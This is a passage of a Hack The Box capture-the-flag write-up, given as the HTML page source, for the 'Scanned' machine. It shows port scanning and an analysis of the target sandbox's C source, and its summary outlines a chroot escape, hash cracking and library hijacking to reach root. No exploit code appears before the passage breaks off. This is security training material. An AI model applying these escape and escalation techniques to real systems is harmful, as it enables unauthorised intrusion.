@@ -1,0 +1,916 @@
+<!doctype html><html lang=es><head><title>Scanned | 7Rocky</title><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge,chrome=1"><meta name=viewport content="width=device-width,minimum-scale=1"><meta name=description content="Hack The Box. Linux. Insane machine. This machine has a website that is able to analyze malware binaries. Analyzing the sandbox C code, we notice that we can use a log file to exfiltrate information through the web server report, and also abuse a misconfiguration to escape from chroot. Then, we can read a SQLite database file and extract a hashed password, which is reused for SSH. Once inside the machine, we are able to run a SUID binary from inside the sandbox and copy a malicious shared library so that the SUID binary runs Bash as root. Deep knowledge about Linux, programming in C and Bash, code audit experience and escaping techniques is needed in order to compromise this machine. This write-up uses a custom Bash script with an embedded C program to list directories and read files from the server and also a Go program to crack a hashed password"><meta itemprop=description content="Hack The Box. Linux. Insane machine. This machine has a website that is able to analyze malware binaries. Analyzing the sandbox C code, we notice that we can use a log file to exfiltrate information through the web server report, and also abuse a misconfiguration to escape from chroot. Then, we can read a SQLite database file and extract a hashed password, which is reused for SSH. Once inside the machine, we are able to run a SUID binary from inside the sandbox and copy a malicious shared library so that the SUID binary runs Bash as root. Deep knowledge about Linux, programming in C and Bash, code audit experience and escaping techniques is needed in order to compromise this machine. This write-up uses a custom Bash script with an embedded C program to list directories and read files from the server and also a Go program to crack a hashed password"><meta name=twitter:description content="Hack The Box. Linux. Insane machine. This machine has a website that is able to analyze malware binaries. Analyzing the sandbox C code, we notice that we can use a log file to exfiltrate information through the web server report, and also abuse a misconfiguration to escape from chroot. Then, we can read a SQLite database file and extract a hashed password, which is reused for SSH. Once inside the machine, we are able to run a SUID binary from inside the sandbox and copy a malicious shared library so that the SUID binary runs Bash as root. Deep knowledge about Linux, programming in C and Bash, code audit experience and escaping techniques is needed in order to compromise this machine. This write-up uses a custom Bash script with an embedded C program to list directories and read files from the server and also a Go program to crack a hashed password"><meta property="og:description" content="Hack The Box. Linux. Insane machine. This machine has a website that is able to analyze malware binaries. Analyzing the sandbox C code, we notice that we can use a log file to exfiltrate information through the web server report, and also abuse a misconfiguration to escape from chroot. Then, we can read a SQLite database file and extract a hashed password, which is reused for SSH. Once inside the machine, we are able to run a SUID binary from inside the sandbox and copy a malicious shared library so that the SUID binary runs Bash as root. Deep knowledge about Linux, programming in C and Bash, code audit experience and escaping techniques is needed in order to compromise this machine. This write-up uses a custom Bash script with an embedded C program to list directories and read files from the server and also a Go program to crack a hashed password"><meta name=robots content="index, follow"><meta name=author content="7Rocky"><meta name=twitter:author content="7Rocky"><meta property="og:author" content="7Rocky"><meta name=image content="https://7rocky.github.io/images/HTB/Scanned/Scanned.png"><meta name=twitter:image content="https://7rocky.github.io/images/HTB/Scanned/Scanned.png"><meta property="og:image" content="https://7rocky.github.io/images/HTB/Scanned/Scanned.png"><meta property="og:site_name" content="7Rocky"><meta itemprop=name content="Scanned"><meta property="og:title" content="Scanned"><meta property="og:url" content="https://7rocky.github.io/en/htb/scanned/"><meta itemprop=keywords content="django,capabilities,suid,race-condition,password-reuse,sandbox-escape,library-hijacking,binary-exploitation,hash-cracking,directory-path-traversal,"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script>
+<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script><link rel="shortcut icon" href=/images/favicon.ico type=image/x-icon><link href=/css/style.css rel=stylesheet><link href=/css/main.css rel=stylesheet><link href=/css/monokai-sublime.min.css rel=stylesheet><link href=/css/code.css rel=stylesheet><script src=/js/highlight.min.js></script>
+<script>hljs.configure({ignoreUnescapedHTML:!0}),hljs.highlightAll()</script><script src=/js/htb.js></script></head><body class="ma0 production"><header style=position:sticky;top:0;z-index:9><div class=bg-black><nav class=ph4-ns role=navigation><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href=/en/ title=7Rocky>7Rocky</a><div class="flex-l items-center"><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href=/htb/scanned/ title=es><img alt=es height=30px src=/images/es.png style="border:4px solid#000;border-radius:100%" width=30px></a>
+<a class="link-transition lang link dib z-999 pt3 pt0-l" href title=en><img alt=en height=30px src=/images/en.png width=30px></a><ul class="pl0 ml3 mr3" style=line-height:30px><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href=/en/ctf/ title=CTF>CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href=/en/htb/ title=HTB>HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href=/en/imc/ title=IMC>IMC</a></li></ul><a href=https://www.linkedin.com/in/roberto-gesteira-minarro/ target=_blank class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel=noopener aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href=https://github.com/7Rocky target=_blank class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel=noopener aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class=pb7 role=main><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-100"><aside aria-label=aside class="instapaper_ignoref b helvetica tracked">HTB</aside><div id=sharing class=mt3><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/en/htb/scanned/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg></a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/en/htb/scanned/&text=Scanned" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&url=https://7rocky.github.io/en/htb/scanned/&title=Scanned" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">Scanned</h1><time class="f6 mv4 dib tracked" datetime=2022-09-10T00:00:00+01:00>10 / 09 / 2022</time></header><div class=htb-image><img alt=Scanned src=/images/HTB/Scanned/Scanned.png></div><ul class="nested-links tags"><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/en/tags/django title=Django>Django</a></li><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/en/tags/capabilities title=Capabilities>Capabilities</a></li><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/en/tags/suid title="SUID Binary">SUID Binary</a></li><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/en/tags/race-condition title="Race condition">Race condition</a></li><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/en/tags/password-reuse title="Password reuse">Password reuse</a></li><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/en/tags/sandbox-escape title="Sandbox escape">Sandbox escape</a></li><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/en/tags/library-hijacking title="Library Hijacking">Library Hijacking</a></li><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/en/tags/binary-exploitation title="Binary exploitation">Binary exploitation</a></li><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/en/tags/hash-cracking title="Password hash cracking">Password hash cracking</a></li><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/en/tags/directory-path-traversal title="Directory Path Traversal">Directory Path Traversal</a></li></ul><aside aria-label=aside class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style=position:sticky;top:5rem><p class="f5 b mb3">Contents of this write-up</p><nav id=TableOfContents><ul><li><a href=#port-scanning>Port scanning</a></li><li><a href=#web-enumeration>Web enumeration</a></li><li><a href=#analyzing-sandbox-code>Analyzing sandbox code</a></li><li><a href=#analyzing-web-application>Analyzing web application</a></li><li><a href=#abusing-misconfigurations>Abusing misconfigurations</a></li><li><a href=#foothold-on-the-machine>Foothold on the machine</a></li><li><a href=#library-hijacking>Library Hijacking</a></li><li><a href=#privilege-escalation>Privilege escalation</a></li></ul></nav></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><ul><li><strong>OS</strong>: Linux</li><li><strong>Difficulty</strong>: Insane</li><li><strong>IP Address</strong>: 10.10.11.141</li><li><strong>Release</strong>: 29 / 01 / 2022</li></ul><h2 id=port-scanning>Port scanning</h2><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight># Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.141 -p 22,80
+Nmap scan report for 10.10.11.141
+Host is up (0.061s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
+| ssh-hostkey:
+|   3072 6a:7b:14:68:97:01:4a:08:6a:e1:37:b1:d2:bd:8f:3f (RSA)
+|   256 f6:b4:e1:10:f0:7b:38:48:66:34:c2:c6:28:ff:b8:25 (ECDSA)
+|_  256 c9:8b:96:19:51:e7:ce:1f:7d:3e:44:e9:a4:04:91:09 (ED25519)
+80/tcp open  http    nginx 1.18.0
+|_http-title: Malware Scanner
+|_http-server-header: nginx/1.18.0
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
+# Nmap done -- 1 IP address (1 host up) scanned in 10.60 seconds
+</code></pre></div><p>This machine has ports 22 (SSH) and 80 (HTTP) open.</p><h2 id=web-enumeration>Web enumeration</h2><p>If we go to <code>http://10.10.11.141</code>, we will see a page like this:</p><p><img src=/images/HTB/Scanned/Scanned-index.png alt="Scanned index"></p><p>It tells that they have developed a secure sandbox using <code>chroot</code>, user namespaces and <code>ptrace</code>. We have another page to upload a malware binary:</p><p><img src=/images/HTB/Scanned/Scanned-upload.png alt="Scanned upload"></p><p>Just for testing, we can compile a simple C program like this one:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk5>#include</span> <span class=mtk4>&lt;stdio.h&gt;</span>
+
+<span class="mtk7 mtki">int</span> <span class=mtk8>main</span><span class=mtk1>()</span> <span class=mtk1>{</span>
+  <span class=mtk8>printf</span><span class=mtk1>(</span><span class=mtk4>"Hello,</span> <span class=mtk4>World!</span><span class=mtk6>\n</span><span class=mtk4>"</span><span class=mtk1>);</span>  
+  <span class=mtk5>return</span> <span class=mtk6>0</span><span class=mtk1>;</span>
+<span class=mtk1>}</span>
+</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>gcc</span> <span class=mtku>hello.c</span> -o hello  
+</code></pre></div><p>And upload it. We will see this report on the system calls used by the binary:</p><p><img src=/images/HTB/Scanned/Scanned-report-test.png alt="Scanned report"></p><p>We might need to analyze the source code for the sandbox and for the web application.</p><h2 id=analyzing-sandbox-code>Analyzing sandbox code</h2><p>This is the <code>main</code> function of the program:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class="mtk7 mtki">int</span> <span class=mtk8>main</span><span class=mtk1>(</span><span class="mtk7 mtki">int</span> <span class="mtk9 mtki">argc</span><span class=mtk1>,</span> <span class="mtk7 mtki">char</span><span class=mtk5>**</span> <span class="mtk9 mtki">argv</span><span class=mtk1>)</span> <span class=mtk1>{</span>
+    <span class=mtk5>if</span> <span class=mtk1>(</span><span class="mtk9 mtki">argc</span> <span class=mtk5>&lt;</span> <span class=mtk6>2</span><span class=mtk1>)</span> <span class=mtk1>{</span>
+        <span class=mtk8>printf</span><span class=mtk1>(</span><span class=mtk4>"Usage:</span> <span class=mtk6>%s</span> <span class=mtk4>&lt;program&gt;</span> <span class=mtk4>[uuid]</span><span class=mtk6>\n</span><span class=mtk4>"</span><span class=mtk1>,</span> <span class="mtk9 mtki">argv</span><span class=mtk1>[</span><span class=mtk6>0</span><span class=mtk1>]);</span>  
+        <span class=mtk8>exit</span><span class=mtk1>(</span><span class=mtk5>-</span><span class=mtk6>2</span><span class=mtk1>);</span>
+    <span class=mtk1>}</span>
+    <span class=mtk5>if</span> <span class=mtk1>(</span><span class=mtk8>strlen</span><span class=mtk1>(</span><span class="mtk9 mtki">argv</span><span class=mtk1>[</span><span class=mtk6>1</span><span class=mtk1>])</span> <span class=mtk5>&gt;</span> <span class=mtk8>FILENAME_MAX</span> <span class=mtk5>-</span> <span class=mtk6>50</span><span class=mtk1>)</span> <span class=mtk1>{</span>
+        <span class=mtk8>DIE</span><span class=mtk1>(</span><span class=mtk4>"Program</span> <span class=mtk4>name</span> <span class=mtk4>too</span> <span class=mtk4>long"</span><span class=mtk1>);</span>
+    <span class=mtk1>}</span>
+    <span class=mtk5>if</span> <span class=mtk1>((</span><span class="mtk9 mtki">argv</span><span class=mtk1>[</span><span class=mtk6>1</span><span class=mtk1>][</span><span class=mtk6>0</span><span class=mtk1>])</span> <span class=mtk5>!=</span> <span class=mtk4>'/'</span><span class=mtk1>)</span> <span class=mtk1>{</span>
+        <span class=mtk8>DIE</span><span class=mtk1>(</span><span class=mtk4>"Program</span> <span class=mtk4>path</span> <span class=mtk4>must</span> <span class=mtk4>be</span> <span class=mtk4>absolute"</span><span class=mtk1>);</span>
+    <span class=mtk1>}</span>
+    <span class=mtk8>umask</span><span class=mtk1>(</span><span class=mtk6>0</span><span class=mtk1>);</span>
+    <span class=mtk8>check_caps</span><span class=mtk1>();</span>
+    <span class="mtk7 mtki">int</span> <span class=mtk1>result</span> <span class=mtk5>=</span> <span class=mtk8>mkdir</span><span class=mtk1>(</span><span class=mtk4>"jails"</span><span class=mtk1>,</span> <span class=mtk5>0</span><span class=mtk6>771</span><span class=mtk1>);</span>
+    <span class=mtk5>if</span> <span class=mtk1>(</span><span class=mtk1>result</span> <span class=mtk5>==</span> <span class=mtk5>-</span><span class=mtk6>1</span> <span class=mtk5>&amp;&amp;</span> <span class=mtk8>errno</span> <span class=mtk5>!=</span> <span class=mtk8>EEXIST</span><span class=mtk1>)</span> <span class=mtk1>{</span>
+        <span class=mtk8>DIE</span><span class=mtk1>(</span> <span class=mtk4>"Could</span> <span class=mtk4>not</span> <span class=mtk4>create</span> <span class=mtk4>jail</span> <span class=mtk4>directory"</span><span class=mtk1>);</span>
+    <span class=mtk1>}</span>
+    <span class="mtk7 mtki">char</span> <span class=mtk1>uuid</span><span class=mtk1>[</span><span class=mtk6>33</span><span class=mtk1>]</span> <span class=mtk5>=</span> <span class=mtk1>{</span><span class=mtk6>0</span><span class=mtk1>};</span>
+    <span class=mtk5>if</span> <span class=mtk1>(</span><span class="mtk9 mtki">argc</span> <span class=mtk5>&lt;</span> <span class=mtk6>3</span><span class=mtk1>)</span> <span class=mtk1>{</span>
+        <span class=mtk8>generate_uuid</span><span class=mtk1>(</span><span class=mtk1>uuid</span><span class=mtk1>);</span>
+    <span class=mtk1>}</span> <span class=mtk5>else</span> <span class=mtk1>{</span>
+        <span class=mtk8>memcpy</span><span class=mtk1>(</span><span class=mtk1>uuid</span><span class=mtk1>,</span> <span class="mtk9 mtki">argv</span><span class=mtk1>[</span><span class=mtk6>2</span><span class=mtk1>],</span> <span class=mtk6>32</span><span class=mtk1>);</span>
+    <span class=mtk1>}</span>
+    <span class=mtk1>uuid</span><span class=mtk1>[</span><span class=mtk6>32</span><span class=mtk1>]</span> <span class=mtk5>=</span> <span class=mtk6>0</span><span class=mtk1>;</span>
+    <span class=mtk8>make_jail</span><span class=mtk1>(</span><span class=mtk1>uuid</span><span class=mtk1>,</span> <span class="mtk9 mtki">argv</span><span class=mtk1>[</span><span class=mtk6>1</span><span class=mtk1>]);</span>
+<span class=mtk1>}</span>
+</code></pre></div><p>The first check is that the <code>sandbox</code> binary has enough capabilities:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class="mtk7 mtki">void</span> <span class=mtk8>check_caps</span><span class=mtk1>()</span> <span class=mtk1>{</span>
+    <span class="mtk7 mtki">struct</span> <span class="mtk8 mtku">user_cap_header_struct</span> <span class=mtk1>header</span><span class=mtk1>;</span>
+    <span class="mtk7 mtki">struct</span> <span class="mtk8 mtku">user_cap_data_struct</span> <span class=mtk1>caps</span><span class=mtk1>;</span>
+    <span class="mtk7 mtki">char</span> <span class=mtk1>pad</span><span class=mtk1>[</span><span class=mtk6>32</span><span class=mtk1>];</span>
+    <span class=mtk1>header</span><span class=mtk1>.</span><span class=mtk1>version</span> <span class=mtk5>=</span> <span class=mtk1>_LINUX_CAPABILITY_VERSION_3;</span>
+    <span class=mtk1>header</span><span class=mtk1>.</span><span class=mtk1>pid</span> <span class=mtk5>=</span> <span class=mtk6>0</span><span class=mtk1>;</span>
+    <span class=mtk1>caps</span><span class=mtk1>.</span><span class=mtk1>effective</span> <span class=mtk5>=</span> <span class=mtk1>caps</span><span class=mtk1>.</span><span class=mtk1>inheritable</span> <span class=mtk5>=</span> <span class=mtk1>caps</span><span class=mtk1>.</span><span class=mtk1>permitted</span> <span class=mtk5>=</span> <span class=mtk6>0</span><span class=mtk1>;</span>  
+    <span class=mtk8>syscall</span><span class=mtk1>(SYS_capget,</span> <span class=mtk5>&amp;</span><span class=mtk1>header</span><span class=mtk1>,</span> <span class=mtk5>&amp;</span><span class=mtk1>caps</span><span class=mtk1>);</span>
+    <span class=mtk5>if</span> <span class=mtk1>(</span><span class=mtk5>!</span><span class=mtk1>(</span><span class=mtk1>caps</span><span class=mtk1>.</span><span class=mtk1>effective</span> <span class=mtk5>&amp;</span> <span class=mtk5>0x</span><span class=mtk6>2401c0</span><span class=mtk1>))</span> <span class=mtk1>{</span>
+        <span class=mtk8>DIE</span><span class=mtk1>(</span><span class=mtk4>"Insufficient</span> <span class=mtk4>capabilities"</span><span class=mtk1>);</span>
+    <span class=mtk1>}</span>
+<span class=mtk1>}</span>
+</code></pre></div><p>We can use <code>capsh</code> to decode the hexadecimal representation of <code>0x2401c0</code> to capability names:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>capsh</span> --decode=0x2401c0
+0x00000000002401c0=cap_setgid,cap_setuid,cap_setpcap,cap_sys_chroot,cap_sys_admin  
+</code></pre></div><p>So the binary has those capabilities, which are really interesting.</p><p>Then it does some configurations on the file system and finally calls <code>make_jail</code>:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class="mtk7 mtki">void</span> <span class=mtk8>make_jail</span><span class=mtk1>(</span><span class="mtk7 mtki">char</span><span class=mtk5>*</span> <span class="mtk9 mtki">name</span><span class=mtk1>,</span> <span class="mtk7 mtki">char</span><span class=mtk5>*</span> <span class="mtk9 mtki">program</span><span class=mtk1>)</span> <span class=mtk1>{</span>
+    <span class=mtk1>jailsfd</span> <span class=mtk5>=</span> <span class=mtk8>open</span><span class=mtk1>(</span><span class=mtk4>"jails"</span><span class=mtk1>,</span> <span class=mtk8>O_RDONLY</span><span class=mtk5>|</span><span class=mtk1>__O_DIRECTORY);</span>  
+    <span class=mtk5>if</span> <span class=mtk1>(</span><span class=mtk8>faccessat</span><span class=mtk1>(</span><span class=mtk1>jailsfd</span><span class=mtk1>,</span> <span class="mtk9 mtki">name</span><span class=mtk1>,</span> <span class=mtk8>F_OK</span><span class=mtk1>,</span> <span class=mtk6>0</span><span class=mtk1>)</span> <span class=mtk5>==</span> <span class=mtk6>0</span><span class=mtk1>)</span> <span class=mtk1>{</span>
+        <span class=mtk8>DIE</span><span class=mtk1>(</span><span class=mtk4>"Jail</span> <span class=mtk4>name</span> <span class=mtk4>exists"</span><span class=mtk1>);</span>
+    <span class=mtk1>}</span>
+    <span class="mtk7 mtki">int</span> <span class=mtk1>result</span> <span class=mtk5>=</span> <span class=mtk8>mkdirat</span><span class=mtk1>(</span><span class=mtk1>jailsfd</span><span class=mtk1>,</span> <span class="mtk9 mtki">name</span><span class=mtk1>,</span> <span class=mtk5>0</span><span class=mtk6>771</span><span class=mtk1>);</span>
+    <span class=mtk5>if</span> <span class=mtk1>(</span><span class=mtk1>result</span> <span class=mtk5>==</span> <span class=mtk5>-</span><span class=mtk6>1</span> <span class=mtk5>&amp;&amp;</span> <span class=mtk8>errno</span> <span class=mtk5>!=</span> <span class=mtk8>EEXIST</span><span class=mtk1>)</span> <span class=mtk1>{</span>
+        <span class=mtk8>DIE</span><span class=mtk1>(</span> <span class=mtk4>"Could</span> <span class=mtk4>not</span> <span class=mtk4>create</span> <span class=mtk4>the</span> <span class=mtk4>jail"</span><span class=mtk1>);</span>
+    <span class=mtk1>}</span>
+
+    <span class=mtk5>if</span> <span class=mtk1>(</span><span class=mtk8>access</span><span class=mtk1>(</span><span class="mtk9 mtki">program</span><span class=mtk1>,</span> <span class=mtk8>F_OK</span><span class=mtk1>)</span> <span class=mtk5>!=</span> <span class=mtk6>0</span><span class=mtk1>)</span> <span class=mtk1>{</span>
+        <span class=mtk8>DIE</span><span class=mtk1>(</span><span class=mtk4>"Program</span> <span class=mtk4>does</span> <span class=mtk4>not</span> <span class=mtk4>exist"</span><span class=mtk1>);</span>
+    <span class=mtk1>}</span>
+    <span class=mtk8>chdir</span><span class=mtk1>(</span><span class=mtk4>"jails"</span><span class=mtk1>);</span>
+    <span class=mtk8>chdir</span><span class=mtk1>(</span><span class="mtk9 mtki">name</span><span class=mtk1>);</span>
+    <span class=mtk8>copy_libs</span><span class=mtk1>();</span>
+    <span class=mtk8>do_namespaces</span><span class=mtk1>();</span>
+    <span class=mtk8>copy</span><span class=mtk1>(</span><span class="mtk9 mtki">program</span><span class=mtk1>,</span> <span class=mtk4>"./userprog"</span><span class=mtk1>);</span>
+    <span class=mtk5>if</span> <span class=mtk1>(</span><span class=mtk8>chroot</span><span class=mtk1>(</span><span class=mtk4>"."</span><span class=mtk1>))</span> <span class=mtk1>{</span><span class=mtk8>DIE</span><span class=mtk1>(</span><span class=mtk4>"Couldn't</span> <span class=mtk4>chroot</span> <span class=mtk4>#1"</span><span class=mtk1>);}</span>
+    <span class=mtk5>if</span> <span class=mtk1>(</span><span class=mtk8>setgid</span><span class=mtk1>(</span><span class=mtk6>1001</span><span class=mtk1>))</span> <span class=mtk1>{</span><span class=mtk8>DIE</span><span class=mtk1>(</span><span class=mtk4>"SGID"</span><span class=mtk1>);}</span>
+    <span class=mtk5>if</span> <span class=mtk1>(</span><span class=mtk8>setegid</span><span class=mtk1>(</span><span class=mtk6>1001</span><span class=mtk1>))</span> <span class=mtk1>{</span><span class=mtk8>DIE</span><span class=mtk1>(</span><span class=mtk4>"SEGID"</span><span class=mtk1>);}</span>
+    <span class=mtk5>if</span> <span class=mtk1>(</span><span class=mtk8>setuid</span><span class=mtk1>(</span><span class=mtk6>1001</span><span class=mtk1>))</span> <span class=mtk1>{</span><span class=mtk8>DIE</span><span class=mtk1>(</span><span class=mtk4>"SUID"</span><span class=mtk1>);};</span>
